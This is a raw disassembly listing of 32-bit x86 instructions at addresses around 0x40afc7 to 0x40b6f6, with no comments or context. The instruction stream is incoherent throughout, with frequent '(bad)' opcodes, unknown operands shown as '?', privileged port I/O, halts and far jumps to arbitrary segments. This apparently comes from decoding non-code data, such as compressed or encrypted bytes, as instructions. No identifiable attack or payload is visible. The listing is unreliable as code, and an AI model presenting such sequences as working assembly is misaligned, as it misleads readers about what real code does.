  40afc7:	stc    
  40afc8:	daa    
  40afc9:	cmp    BYTE PTR [esi+0x51207598],ah
  40afcf:	dec    esi
  40afd0:	iret   
  40afd1:	mov    edx,eax
  40afd3:	rol    DWORD PTR [ebp+0xeba5122],0x8a
  40afda:	and    ah,BYTE PTR [ecx-0xa]
  40afdd:	fxam   
  40afdf:	fs push esi
  40afe1:	add    al,0x3e
  40afe3:	inc    ebx
  40afe4:	mov    ebp,0xa2f553bb
  40afe9:	ja     0x40b02f
  40afeb:	bound  edi,QWORD PTR [ebp+0x31e18141]
  40aff1:	cmp    eax,0x9400ebf1
  40aff6:	lods   al,BYTE PTR ds:[esi]
  40aff7:	push   ds
  40aff8:	push   0xffffffcf
  40affa:	popa   
  40affb:	es hlt 
  40affd:	fadd   DWORD PTR [eax]
  40afff:	push   esi
  40b000:	out    dx,eax
  40b001:	adc    eax,DWORD PTR [edx]
  40b003:	or     DWORD PTR [edi-0x80],esi
  40b006:	pop    edi
  40b007:	jle    0x40afea
  40b009:	mov    ebx,0x9277ae46
  40b00e:	popf   
  40b00f:	(bad)  
  40b010:	lods   al,BYTE PTR ds:[esi]
  40b011:	stos   BYTE PTR es:[edi],al
  40b012:	mov    DWORD PTR [eax+0xe],0xae4eca5a
  40b019:	push   edi
  40b01a:	mov    ecx,0x8e82780f
  40b01f:	mov    DWORD PTR [eax+0x54e202cb],eax
  40b025:	xor    edx,DWORD PTR [ebx]
  40b027:	shr    BYTE PTR [esi+esi*8+0x63],0x92
  40b02c:	mov    ss,WORD PTR [ecx]
  40b02e:	ror    DWORD PTR [ebx+0x3d4e79cb],cl
  40b034:	dec    ebp
  40b035:	sub    al,0xc5
  40b037:	cs ins BYTE PTR es:[edi],dx
  40b039:	fbld   TBYTE PTR [edx+edi*2]
  40b03c:	stos   DWORD PTR es:[edi],eax
  40b03d:	adc    eax,DWORD PTR [ecx+0x6149c1bc]
  40b043:	rcl    DWORD PTR [eax+0x6540d787],1
  40b049:	int    0x85
  40b04b:	sub    edx,DWORD PTR [ebx+0x1b]
  40b04e:	std    
  40b04f:	add    DWORD PTR [edi+eax*8+0x31],0x15a94909
  40b057:	and    eax,0x59a9b815
  40b05c:	xchg   esp,eax
  40b05d:	add    al,0x32
  40b05f:	repnz mov ds:0xabb56dc4,al
  40b065:	pop    esp
  40b066:	mov    BYTE PTR [edi+edx*1+0x53],0x1
  40b06b:	cmp    eax,eax
  40b06d:	inc    esi
  40b06e:	enter  0x8632,0xa9
  40b072:	dec    edx
  40b073:	sbb    eax,0x998ca0b6
  40b078:	push   edi
  40b079:	bound  eax,QWORD PTR [esi+0x585641ef]
  40b07f:	cwde   
  40b080:	cli    
  40b081:	in     eax,0x20
  40b083:	popa   
  40b084:	pushf  
  40b085:	cmp    BYTE PTR [ebx-0xc],ah
  40b088:	pusha  
  40b089:	or     edi,DWORD PTR [eax-0x4]
  40b08c:	aam    0xfd
  40b08e:	ins    BYTE PTR es:[edi],dx
  40b08f:	mov    bh,0xf5
  40b091:	xchg   ebp,eax
  40b092:	sbb    ecx,DWORD PTR [ebx-0x69]
  40b095:	pop    edi
  40b096:	loopne 0x40b0ce
  40b098:	pop    ss
  40b099:	repnz pop ebp
  40b09b:	adc    eax,0x388915db
  40b0a0:	mov    bl,0xc4
  40b0a2:	or     ebx,edi
  40b0a4:	inc    ebp
  40b0a5:	sbb    BYTE PTR [edi-0x62646dcc],ah
  40b0ab:	pop    ebp
  40b0ac:	pop    edx
  40b0ad:	pop    es
  40b0ae:	and    al,0xea
  40b0b0:	jo     0x40b054
  40b0b2:	mov    bl,0x61
  40b0b4:	aam    0xd
  40b0b6:	cmovs  ebx,eax
  40b0b9:	es into 
  40b0bb:	fisubr WORD PTR ss:[ebp-0x74a64436]
  40b0c2:	pop    ebx
  40b0c3:	push   0xe541a163
  40b0c8:	mov    eax,ds:0x71d0bdbe
  40b0cd:	mov    ebp,0x290eab78
  40b0d2:	clc    
  40b0d3:	xchg   DWORD PTR [ebx],ecx
  40b0d5:	enter  0xa475,0xf7
  40b0d9:	clc    
  40b0da:	sbb    al,0x83
  40b0dc:	es pusha 
  40b0de:	xor    bh,ah
  40b0e0:	aad    0xf5
  40b0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e3:	cli    
  40b0e4:	fst    QWORD PTR [esi*8-0x4d772599]
  40b0eb:	jno    0x40b0d9
  40b0ed:	adc    bh,BYTE PTR [ebx]
  40b0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f0:	call   0x64c3:0xb0eac41c
  40b0f7:	cwde   
  40b0f8:	cmp    eax,0x461f2750
  40b0fd:	xchg   esi,eax
  40b0fe:	inc    eax
  40b0ff:	int    0x5a
  40b101:	out    dx,al
  40b102:	adc    ecx,esp
  40b104:	xchg   ch,al
  40b106:	sub    ecx,DWORD PTR [esi]
  40b108:	(bad)  
  40b10a:	shl    BYTE PTR [ebx],cl
  40b10c:	std    
  40b10d:	sti    
  40b10e:	xor    al,0x2b
  40b110:	stos   BYTE PTR es:[edi],al
  40b111:	mov    edi,0xa41fedaf
  40b116:	jne    0x40b18d
  40b118:	popf   
  40b119:	cmp    dl,bh
  40b11b:	sub    eax,DWORD PTR [edi]
  40b11d:	jae    0x40b12a
  40b11f:	mov    WORD PTR [esp+edi*4-0x31],?
  40b123:	lahf   
  40b124:	in     al,dx
  40b125:	inc    esi
  40b126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b127:	pop    ss
  40b128:	cli    
  40b129:	ficom  DWORD PTR [esp+eiz*2]
  40b12c:	jle    0x40b195
  40b12e:	pop    ebx
  40b12f:	pop    edx
  40b130:	and    eax,0xad280467
  40b135:	dec    ebp
  40b136:	add    al,al
  40b138:	inc    esp
  40b139:	loop   0x40b145
  40b13b:	repz inc ebp
  40b13d:	test   esi,esi
  40b13f:	cdq    
  40b140:	or     esp,DWORD PTR [esi+0x46]
  40b143:	in     eax,0x59
  40b145:	fnstsw WORD PTR [esi]
  40b147:	mov    eax,ds:0x936a7ea2
  40b14c:	aad    0xf7
  40b14e:	mov    cs,WORD PTR [esi]
  40b150:	stc    
  40b151:	aad    0xa3
  40b153:	push   esp
  40b154:	inc    edi
  40b155:	mov    al,0xb5
  40b157:	imul   ebp,edx,0xffffffa3
  40b15a:	loop   0x40b149
  40b15c:	pop    edi
  40b15d:	fisttp DWORD PTR [ebx-0x35]
  40b160:	sub    eax,0x55aa0c50
  40b165:	retf   
  40b166:	pop    ecx
  40b167:	lds    edi,FWORD PTR [ecx+eiz*4]
  40b16a:	dec    DWORD PTR [edx-0x19]
  40b16d:	call   0x363f:0x45200238
  40b174:	push   ecx
  40b175:	dec    BYTE PTR [esi-0x36aaa330]
  40b17b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b17c:	mov    DWORD PTR [edi-0x1d],edi
  40b17f:	sahf   
  40b180:	sti    
  40b181:	hlt    
  40b182:	enter  0x9c56,0xd
  40b186:	sub    edi,DWORD PTR [ebx+0x6bf2957]
  40b18c:	ins    DWORD PTR es:[edi],dx
  40b18d:	lea    eax,[ecx+edi*8-0x62a73f50]
  40b194:	and    edi,esi
  40b196:	sbb    al,BYTE PTR [edx]
  40b198:	into   
  40b199:	repnz mov ebp,0x9b19a5ca
  40b19f:	sub    bl,dh
  40b1a1:	in     eax,dx
  40b1a2:	loop   0x40b190
  40b1a4:	mov    edi,0x13095197
  40b1a9:	jne    0x40b1ed
  40b1ab:	pop    edi
  40b1ac:	jp     0x40b1cf
  40b1ae:	inc    edi
  40b1af:	push   esi
  40b1b0:	pusha  
  40b1b1:	cmp    al,0x4e
  40b1b3:	test   DWORD PTR [ecx],ecx
  40b1b5:	xor    eax,0x38946194
  40b1ba:	xor    al,0x4c
  40b1bc:	xor    edi,DWORD PTR [ebx+0x4eba42da]
  40b1c2:	cmp    esi,ebp
  40b1c4:	cmp    DWORD PTR [esi-0x376f3881],ecx
  40b1ca:	jmp    0x40b175
  40b1cc:	lods   eax,DWORD PTR ds:[esi]
  40b1cd:	sahf   
  40b1ce:	gs ss loope 0x40b1d5
  40b1d2:	and    eax,0x8639b19f
  40b1d7:	mov    ebp,0xc336241e
  40b1dc:	fdivr  QWORD PTR [edx]
  40b1de:	mov    ds:0xe24be24d,al
  40b1e3:	add    eax,DWORD PTR [esi]
  40b1e5:	dec    ebx
  40b1e6:	sub    al,0x7b
  40b1e8:	js     0x40b1fa
  40b1ea:	clc    
  40b1eb:	neg    ebp
  40b1ed:	(bad)  
  40b1ee:	sbb    ebp,ebx
  40b1f0:	in     eax,dx
  40b1f1:	sbb    BYTE PTR [ecx],0x5f
  40b1f4:	jno    0x40b23d
  40b1f6:	sub    eax,0xb66a8194
  40b1fb:	leave  
  40b1fc:	dec    ecx
  40b1fd:	cmp    al,0xc8
  40b1ff:	cdq    
  40b200:	out    dx,eax
  40b201:	push   edi
  40b202:	inc    edx
  40b203:	in     eax,0x1c
  40b205:	inc    esi
  40b206:	inc    eax
  40b207:	mov    edx,0x342aaae
  40b20c:	in     eax,dx
  40b20d:	lds    ebx,FWORD PTR [esi+esi*1+0x18]
  40b211:	or     cl,BYTE PTR [edx-0x3e]
  40b214:	stos   BYTE PTR es:[edi],al
  40b215:	lods   al,BYTE PTR ds:[esi]
  40b216:	xchg   esi,eax
  40b217:	imul   eax,DWORD PTR [ebx+0x71],0x27c61619
  40b21e:	dec    ecx
  40b21f:	fisub  WORD PTR [eax+0x6da07002]
  40b225:	fist   DWORD PTR [ebp-0x75]
  40b228:	push   edx
  40b229:	jge    0x40b21d
  40b22b:	mov    esi,0x59f033ba
  40b230:	cwde   
  40b231:	lahf   
  40b232:	jo     0x40b295
  40b234:	pop    ebp
  40b235:	add    BYTE PTR [eax+esi*2-0x53],dh
  40b239:	xchg   ebx,eax
  40b23a:	shl    BYTE PTR [ebp-0x27],0x41
  40b23e:	fst    QWORD PTR [esi+0xd]
  40b241:	inc    ebx
  40b242:	in     al,0xe8
  40b244:	cmp    BYTE PTR [esi+eax*4-0x15],bh
  40b248:	sbb    al,0xc4
  40b24a:	mov    al,ds:0x5c1ebd9d
  40b24f:	adc    dh,cl
  40b251:	and    esp,DWORD PTR [esi+0xb557bc]
  40b257:	sub    edi,DWORD PTR [ecx+0x3f7ed570]
  40b25d:	cmc    
  40b25e:	push   eax
  40b25f:	jp     0x40b2a9
  40b261:	imul   esp,ebx,0xfffffff7
  40b264:	add    BYTE PTR [esi],0xd8
  40b267:	and    eax,0x74034026
  40b26c:	(bad)  
  40b26d:	call   0x23b9:0x19ca6084
  40b274:	or     BYTE PTR [eax+0x24],cl
  40b277:	cmp    DWORD PTR [ebp-0x3e0c2b48],0xffffff92
  40b27e:	es pop ss
  40b280:	popf   
  40b281:	icebp  
  40b282:	xchg   ebx,eax
  40b283:	fist   DWORD PTR [esi-0x5f666445]
  40b289:	repz push 0x5e
  40b28c:	or     eax,0x3368963d
  40b291:	xchg   DWORD PTR ds:0xaa51fcb3,esi
  40b297:	test   al,0x70
  40b299:	add    DWORD PTR [edx],0x2cfaaa62
  40b29f:	in     eax,dx
  40b2a0:	xlat   BYTE PTR ds:[ebx]
  40b2a1:	lock fidivr WORD PTR [eax]
  40b2a4:	je     0x40b24f
  40b2a6:	jmp    0x76fb:0x70f663d0
  40b2ad:	(bad)  
  40b2ae:	cwde   
  40b2af:	popa   
  40b2b0:	jno    0x40b2e3
  40b2b2:	enter  0x6d1d,0x51
  40b2b6:	and    BYTE PTR [eax],bh
  40b2b8:	dec    edx
  40b2b9:	mov    ecx,0xf6dd4ab0
  40b2be:	push   esp
  40b2bf:	aas    
  40b2c0:	dec    ebx
  40b2c1:	inc    ecx
  40b2c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2c3:	lea    eax,[ebx]
  40b2c5:	enter  0x779d,0x1e
  40b2c9:	mov    es,ecx
  40b2cb:	out    0xc3,eax
  40b2cd:	lds    edx,FWORD PTR [edi+0x5d]
  40b2d0:	pop    ecx
  40b2d1:	cmp    ch,BYTE PTR [edx-0x9]
  40b2d4:	mov    ds:0x353f9f64,al
  40b2d9:	in     eax,dx
  40b2da:	xchg   ecx,eax
  40b2db:	xchg   esp,eax
  40b2dc:	stc    
  40b2dd:	adc    eax,DWORD PTR [ecx-0x1caf63cc]
  40b2e3:	js     0x40b2d7
  40b2e5:	icebp  
  40b2e6:	xchg   ebp,eax
  40b2e7:	clc    
  40b2e8:	je     0x40b323
  40b2ea:	jl     0x40b31c
  40b2ec:	ror    DWORD PTR [eax+0x28],0x83
  40b2f0:	xor    BYTE PTR [ecx+0x7f059256],dh
  40b2f6:	jns    0x40b2a2
  40b2f8:	shr    BYTE PTR [esi+eax*8],1
  40b2fb:	and    edi,DWORD PTR [esi-0x48]
  40b2fe:	xchg   ebx,eax
  40b2ff:	sbb    ah,BYTE PTR [esi+0x42ff8e98]
  40b305:	sar    BYTE PTR [ecx+0x71f36539],1
  40b30b:	stos   BYTE PTR es:[edi],al
  40b30c:	int    0xf2
  40b30e:	fcmovnu st,st(2)
  40b310:	das    
  40b311:	neg    edi
  40b313:	adc    al,0xb7
  40b315:	pop    ss
  40b316:	xor    BYTE PTR [esi+0x78],0x3d
  40b31a:	lock cmp esp,esp
  40b31d:	stos   BYTE PTR es:[edi],al
  40b31e:	int3   
  40b31f:	mov    ch,0x97
  40b321:	dec    eax
  40b322:	or     ecx,ebx
  40b324:	es mov edi,esi
  40b327:	ror    DWORD PTR [eax+eax*8],0x20
  40b32b:	pop    esi
  40b32c:	jnp    0x40b305
  40b32e:	push   edi
  40b32f:	mov    ds,WORD PTR [esi+0x562b88e2]
  40b335:	jecxz  0x40b3b6
  40b337:	sub    eax,0x79d399bc
  40b33c:	aad    0x49
  40b33e:	shld   DWORD PTR [edi],eax,cl
  40b341:	mov    eax,ds:0xe2b223c9
  40b346:	inc    ecx
  40b347:	push   edx
  40b348:	jecxz  0x40b32a
  40b34a:	xor    edx,ebp
  40b34c:	push   ds
  40b34d:	arpl   WORD PTR [ecx-0x4e1b10e1],bx
  40b353:	fbstp  TBYTE PTR [ecx]
  40b355:	jecxz  0x40b381
  40b357:	outs   dx,DWORD PTR ds:[esi]
  40b358:	push   es
  40b359:	fcom   DWORD PTR [esi]
  40b35b:	cwde   
  40b35c:	in     eax,dx
  40b35d:	mov    dl,al
  40b35f:	ds stos BYTE PTR es:[edi],al
  40b361:	loope  0x40b364
  40b363:	sub    BYTE PTR [ebp+0x4d9de6fe],al
  40b369:	jp     0x40b382
  40b36b:	push   es
  40b36c:	dec    edx
  40b36d:	add    DWORD PTR [ecx],esi
  40b36f:	shr    dh,0x45
  40b372:	das    
  40b373:	mov    bl,0xc9
  40b375:	retf   0xe24c
  40b378:	repz ret 
  40b37a:	test   eax,0xc71c5fb5
  40b37f:	lahf   
  40b380:	loope  0x40b370
  40b382:	and    eax,0x1e28c18
  40b387:	ret    0xa64e
  40b38a:	add    al,0x2f
  40b38c:	pop    ebp
  40b38d:	mov    ecx,0x7c7612fe
  40b392:	mov    cl,0xce
  40b394:	add    BYTE PTR [eax],0x96
  40b397:	and    al,0x9d
  40b399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b39a:	sub    al,0x3d
  40b39c:	loope  0x40b3f4
  40b39e:	int3   
  40b39f:	fwait
  40b3a0:	push   esp
  40b3a1:	cmp    al,0x71
  40b3a3:	xchg   esi,eax
  40b3a4:	aaa    
  40b3a5:	call   0xe25a969a
  40b3aa:	xor    eax,0x9891ed8d
  40b3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b0:	sub    bl,BYTE PTR [edx]
  40b3b2:	dec    eax
  40b3b3:	mov    dl,0x3b
  40b3b5:	rcl    DWORD PTR [eax-0x47],1
  40b3b8:	jns    0x40b3f7
  40b3ba:	iret   
  40b3bb:	popa   
  40b3bc:	(bad)  
  40b3bd:	adc    eax,0x58b1925c
  40b3c2:	xor    eax,0xcd9da396
  40b3c7:	aaa    
  40b3c8:	test   al,0xd1
  40b3ca:	jle    0x40b439
  40b3cc:	add    BYTE PTR [esi+0x446601d5],cl
  40b3d2:	push   es
  40b3d3:	std    
  40b3d4:	aad    0x66
  40b3d6:	fstp   DWORD PTR [ebp-0x27]
  40b3d9:	inc    esi
  40b3da:	sbb    ebx,ebx
  40b3dc:	js     0x40b39d
  40b3de:	sub    al,0x17
  40b3e0:	arpl   cx,ax
  40b3e2:	or     ebx,DWORD PTR [eax+0x2ce8bc05]
  40b3e8:	mov    ?,WORD PTR [ebx+0x47]
  40b3eb:	sti    
  40b3ec:	mov    BYTE PTR [esp+esi*8-0x5d],bl
  40b3f0:	cmc    
  40b3f1:	cmp    BYTE PTR [eax+esi*8-0x3d64e3ca],0x67
  40b3f9:	adc    eax,0x6179d248
  40b3fe:	or     DWORD PTR [eax],0x9e2d42b6
  40b404:	push   esi
  40b405:	xor    eax,0xa1bb883e
  40b40a:	jle    0x40b464
  40b40c:	aas    
  40b40d:	mov    BYTE PTR [esi-0x6d],0xb
  40b411:	xlat   BYTE PTR ds:[ebx]
  40b412:	sbb    BYTE PTR [ebx-0x8],dl
  40b415:	sbb    eax,0xb8f963cb
  40b41a:	scas   al,BYTE PTR es:[edi]
  40b41b:	pop    ebp
  40b41c:	ins    DWORD PTR es:[edi],dx
  40b41d:	inc    edx
  40b41e:	mov    ah,dl
  40b420:	mov    ah,0x6c
  40b422:	pop    edi
  40b423:	jg     0x40b3af
  40b425:	inc    esi
  40b426:	shr    DWORD PTR [ebx],cl
  40b428:	into   
  40b429:	xor    BYTE PTR [ecx+0xf],al
  40b42c:	mov    al,0x40
  40b42e:	sbb    ch,BYTE PTR ds:0x35f190e3
  40b434:	fistp  DWORD PTR [esi]
  40b436:	mov    ch,ah
  40b438:	cwde   
  40b439:	mov    WORD PTR [ebp+0x7e714508],?
  40b43f:	pop    ebx
  40b440:	stos   BYTE PTR es:[edi],al
  40b441:	or     al,dl
  40b443:	outs   dx,BYTE PTR ds:[esi]
  40b444:	mov    ecx,0x73c6a8a2
  40b449:	sub    DWORD PTR [ecx+ecx*2],eax
  40b44c:	nop
  40b44d:	addr16 push esp
  40b44f:	idiv   DWORD PTR [edx-0x11ba8c20]
  40b455:	dec    ebx
  40b456:	or     dl,cl
  40b458:	fistp  WORD PTR [edi]
  40b45a:	cmc    
  40b45b:	jp     0x40b3e9
  40b45d:	cmp    ch,bh
  40b45f:	int    0x34
  40b461:	cdq    
  40b462:	(bad)  
  40b463:	pop    ebp
  40b464:	ss push cs
  40b466:	loope  0x40b3f9
  40b468:	dec    edi
  40b469:	test   BYTE PTR es:[eax+0x59d2d925],ch
  40b470:	sbb    ah,BYTE PTR [ecx]
  40b472:	idiv   BYTE PTR [ecx-0x14f65e87]
  40b478:	dec    esi
  40b479:	in     eax,0x4d
  40b47b:	mov    ecx,0xfb3a814d
  40b480:	pushf  
  40b481:	icebp  
  40b482:	imul   ebp,DWORD PTR [edx+0x10],0x6d93b3ba
  40b489:	popa   
  40b48a:	sbb    eax,0x84fe9310
  40b48f:	out    0x3c,eax
  40b491:	stc    
  40b492:	loopne 0x40b473
  40b494:	mov    ecx,0x87f3d15a
  40b499:	xor    esi,DWORD PTR [ecx+0x7cf72add]
  40b49f:	xchg   ebx,eax
  40b4a0:	xor    cl,0xe8
  40b4a3:	outs   dx,BYTE PTR ds:[esi]
  40b4a4:	pop    ds
  40b4a5:	inc    ebp
  40b4a6:	lods   al,BYTE PTR ds:[esi]
  40b4a7:	add    bl,bl
  40b4a9:	imul   edi,esi,0xffffffee
  40b4ac:	pop    DWORD PTR [ecx]
  40b4ae:	mov    ebx,fs
  40b4b0:	fwait
  40b4b1:	inc    ecx
  40b4b2:	jp     0x40b4a0
  40b4b4:	sbb    al,0x6a
  40b4b6:	mov    bh,0xc1
  40b4b8:	(bad)  
  40b4b9:	cwde   
  40b4ba:	bound  ebp,QWORD PTR [ebp-0x710a828c]
  40b4c0:	pushf  
  40b4c1:	pop    esp
  40b4c2:	mov    ah,0xc8
  40b4c4:	jge    0x40b459
  40b4c6:	xchg   BYTE PTR [esi-0x7],ch
  40b4c9:	je     0x40b4ca
  40b4cb:	xchg   ebp,eax
  40b4cc:	je     0x40b50f
  40b4ce:	ret    0x74e7
  40b4d1:	mov    ds:0x83554abf,al
  40b4d6:	clc    
  40b4d7:	lods   eax,DWORD PTR ds:[esi]
  40b4d8:	mov    cl,BYTE PTR [eax+ebx*8+0x45]
  40b4dc:	scas   eax,DWORD PTR es:[edi]
  40b4dd:	pop    ecx
  40b4de:	repnz mov esi,DWORD PTR ds:0x85c11730
  40b4e5:	pop    ebx
  40b4e6:	cwde   
  40b4e7:	mov    ch,0xba
  40b4e9:	mov    BYTE PTR [ebx-0x139a12f8],ch
  40b4ef:	cmc    
  40b4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f1:	scas   al,BYTE PTR es:[edi]
  40b4f2:	out    dx,eax
  40b4f3:	repnz mov edx,DWORD PTR [ebx+esi*8-0x2e59435c]
  40b4fb:	mov    ah,0x41
  40b4fd:	adc    ecx,DWORD PTR [ebx]
  40b4ff:	cmp    al,0xed
  40b501:	jb     0x40b515
  40b503:	mov    fs,ecx
  40b505:	mov    esi,DWORD PTR [edx-0x4e]
  40b508:	rcr    BYTE PTR [edx+ebx*2+0x5f615389],cl
  40b50f:	and    ch,BYTE PTR [esi]
  40b511:	mov    ds:0xeffc83a6,al
  40b516:	sub    DWORD PTR [eax],ebp
  40b518:	add    esp,edi
  40b51a:	pusha  
  40b51b:	inc    ecx
  40b51c:	xchg   DWORD PTR [edx],ebx
  40b51e:	push   edx
  40b51f:	fild   DWORD PTR [edi-0x5]
  40b522:	dec    edi
  40b523:	push   edi
  40b524:	dec    esi
  40b525:	sti    
  40b526:	sbb    eax,0x988da91c
  40b52b:	xchg   cl,bl
  40b52d:	pusha  
  40b52e:	sub    al,0x3c
  40b530:	lock jno 0x40b4bb
  40b533:	sbb    BYTE PTR [edi+0x6c],al
  40b536:	jb     0x40b59b
  40b538:	ins    DWORD PTR es:[edi],dx
  40b539:	shl    edx,cl
  40b53b:	pop    ebx
  40b53c:	sub    al,0x7
  40b53e:	mov    ah,dl
  40b540:	jg     0x40b4e6
  40b542:	icebp  
  40b543:	or     eax,0x7218db58
  40b548:	mov    cl,0x8f
  40b54a:	inc    esi
  40b54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b54c:	hlt    
  40b54d:	fdivr  QWORD PTR [ebx]
  40b54f:	pop    eax
  40b550:	out    0x12,al
  40b552:	pop    edx
  40b553:	jnp    0x40b580
  40b555:	call   0x8ca6bdb6
  40b55a:	jge    0x40b509
  40b55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b55d:	inc    ebx
  40b55e:	add    eax,0x6fa2795b
  40b563:	pop    esp
  40b564:	add    edx,DWORD PTR [eax+0x28a958de]
  40b56a:	push   esp
  40b56b:	jl     0x40b521
  40b56d:	je     0x40b59d
  40b56f:	pop    es
  40b570:	sbb    al,0x45
  40b572:	jg     0x40b594
  40b574:	iret   
  40b575:	jo     0x40b59c
  40b577:	push   esi
  40b578:	jge    0x40b596
  40b57a:	out    0xe9,eax
  40b57c:	mov    ecx,0xb128e809
  40b581:	xchg   edx,eax
  40b582:	inc    ecx
  40b583:	push   es
  40b584:	xchg   esi,eax
  40b585:	inc    eax
  40b586:	xchg   ebp,eax
  40b587:	cmc    
  40b588:	leave  
  40b589:	or     esi,edi
  40b58b:	sbb    edi,DWORD PTR [ebx+0x35]
  40b58e:	call   0xb345:0x16a7e270
  40b595:	push   ebp
  40b596:	sub    dl,BYTE PTR [ebx-0x5f37f22e]
  40b59c:	jg     0x40b586
  40b59e:	jge    0x40b583
  40b5a0:	std    
  40b5a1:	sti    
  40b5a2:	scas   eax,DWORD PTR es:[edi]
  40b5a3:	aaa    
  40b5a4:	xlat   BYTE PTR ds:[ebx]
  40b5a5:	dec    ecx
  40b5a6:	sbb    esi,DWORD PTR [ecx]
  40b5a8:	push   0x4f7c1036
  40b5ad:	repz inc ecx
  40b5af:	adc    DWORD PTR [ebx-0x31],edx
  40b5b2:	cmp    cl,BYTE PTR [edi+0x42]
  40b5b5:	call   0x4451357e
  40b5ba:	cmp    al,0x92
  40b5bc:	icebp  
  40b5bd:	cmp    BYTE PTR [edi],dh
  40b5bf:	xchg   edx,eax
  40b5c0:	fnclex 
  40b5c2:	test   ebp,0xe9cec9f1
  40b5c8:	in     al,dx
  40b5c9:	sahf   
  40b5ca:	mov    ecx,es
  40b5cc:	clc    
  40b5cd:	dec    ecx
  40b5ce:	adc    dl,bl
  40b5d0:	inc    esi
  40b5d1:	int    0xab
  40b5d3:	imul   esp,DWORD PTR ds:0x70196c6c,0x59
  40b5da:	mov    eax,DWORD PTR ds:0xbee71998
  40b5e0:	sub    al,0x87
  40b5e2:	cmp    DWORD PTR [ebp+0x438673c9],edx
  40b5e8:	jns    0x40b5a6
  40b5ea:	or     BYTE PTR [edi+0x1],bl
  40b5ed:	out    dx,eax
  40b5ee:	ins    BYTE PTR es:[edi],dx
  40b5ef:	jecxz  0x40b5b0
  40b5f1:	test   al,0x59
  40b5f3:	push   esi
  40b5f4:	pop    eax
  40b5f5:	out    dx,eax
  40b5f6:	dec    edi
  40b5f7:	scas   al,BYTE PTR es:[edi]
  40b5f8:	inc    edi
  40b5f9:	cmp    BYTE PTR [ecx-0x5cff049a],ch
  40b5ff:	sbb    ebp,DWORD PTR [eax]
  40b601:	mov    edi,0x85a0587f
  40b606:	and    eax,esp
  40b608:	call   0x68bf:0x185fdd7d
  40b60f:	mov    edx,0xfc18e30e
  40b614:	adc    eax,DWORD PTR [esi]
  40b616:	mov    edi,esi
  40b618:	mov    ebp,0x6b475716
  40b61d:	sbb    edi,esi
  40b61f:	imul   edi,edx,0xffffff9f
  40b622:	dec    esi
  40b623:	idiv   BYTE PTR [ebx+ecx*2]
  40b626:	jge    0x40b655
  40b628:	and    dh,bl
  40b62a:	fmul   QWORD PTR [eax+ebp*4-0x48b1f6bb]
  40b631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b632:	jne    0x40b631
  40b634:	xor    al,0xe
  40b636:	add    edx,DWORD PTR [ebx]
  40b638:	mov    es,WORD PTR [ebx-0xd]
  40b63b:	mov    bh,0x7f
  40b63d:	das    
  40b63e:	mov    bh,0x42
  40b640:	sbb    esi,DWORD PTR [esi]
  40b642:	fistp  DWORD PTR [ecx-0x68]
  40b645:	pop    ecx
  40b646:	aad    0x43
  40b648:	jmp    0x40b659
  40b64a:	loopne 0x40b607
  40b64c:	inc    edx
  40b64d:	es xchg ecx,eax
  40b64f:	hlt    
  40b650:	and    bh,BYTE PTR [eax+0x594a75ef]
  40b656:	into   
  40b657:	mov    ebx,0x3cddbc0e
  40b65c:	sbb    edx,DWORD PTR [edi]
  40b65e:	repz repz or DWORD PTR [edi+edi*1],esp
  40b663:	mov    ?,esp
  40b665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b666:	mov    ecx,0x12cc77bd
  40b66c:	pusha  
  40b66d:	mov    cl,BYTE PTR [ebx-0x4]
  40b670:	in     al,0x5c
  40b672:	ds out dx,eax
  40b674:	push   es
  40b675:	pop    esi
  40b676:	pop    es
  40b677:	sti    
  40b678:	jmp    0x40b677
  40b67a:	mov    cl,0x62
  40b67c:	fld    QWORD PTR [edi]
  40b67e:	pusha  
  40b67f:	jnp    0x40b6af
  40b681:	data16 stos BYTE PTR es:[edi],al
  40b683:	sub    al,0x73
  40b685:	xor    BYTE PTR [ebp+0x6d],0x5a
  40b689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b68a:	out    0x70,eax
  40b68c:	xchg   esi,eax
  40b68d:	ja     0x40b612
  40b68f:	adc    al,0xc7
  40b691:	sub    DWORD PTR [esi-0x11e6170b],edi
  40b697:	mov    al,0x81
  40b699:	push   ebp
  40b69a:	addr16 arpl ax,ax
  40b69d:	jle    0x40b6b7
  40b69f:	fucomp st(6)
  40b6a1:	dec    ebx
  40b6a2:	out    dx,al
  40b6a3:	idiv   BYTE PTR [ebx]
  40b6a5:	push   0x81ae9bb8
  40b6aa:	push   edi
  40b6ab:	cmp    dh,BYTE PTR [ecx]
  40b6ad:	mov    es,edx
  40b6af:	mov    al,ds:0xf60555d4
  40b6b4:	mov    DWORD PTR [edi+0x1b],ebx
  40b6b7:	ins    BYTE PTR es:[edi],dx
  40b6b8:	jg     0x40b6e3
  40b6ba:	push   ds
  40b6bb:	pop    eax
  40b6bc:	repz cmc 
  40b6be:	dec    ebx
  40b6bf:	sbb    eax,0x582cfaf3
  40b6c4:	aad    0xa9
  40b6c6:	fnstsw WORD PTR [ebx]
  40b6c8:	imul   edx,esi,0xffffffb4
  40b6cb:	xor    edx,DWORD PTR [edi]
  40b6cd:	sub    BYTE PTR [ecx],ah
  40b6cf:	(bad)  
  40b6d0:	jmp    0x475e:0xecb17ee1
  40b6d7:	xchg   ecx,eax
  40b6d8:	adc    esp,edx
  40b6da:	popf   
  40b6db:	mov    eax,0x5ec7a601
  40b6e0:	bound  ebx,QWORD PTR ds:0x1cec689
  40b6e6:	inc    ecx
  40b6e7:	inc    eax
  40b6e8:	jnp    0x40b6ea
  40b6ea:	repnz xchg ebp,eax
  40b6ec:	cmc    
  40b6ed:	jg     0x40b6ac
  40b6ef:	pop    edx
  40b6f0:	inc    ebx
  40b6f1:	push   ecx
  40b6f2:	pop    ds
  40b6f3:	xchg   edx,eax
  40b6f4:	add    cl,ch
  40b6f6:	add    dh,BYTE PTR [ebx+0x9]
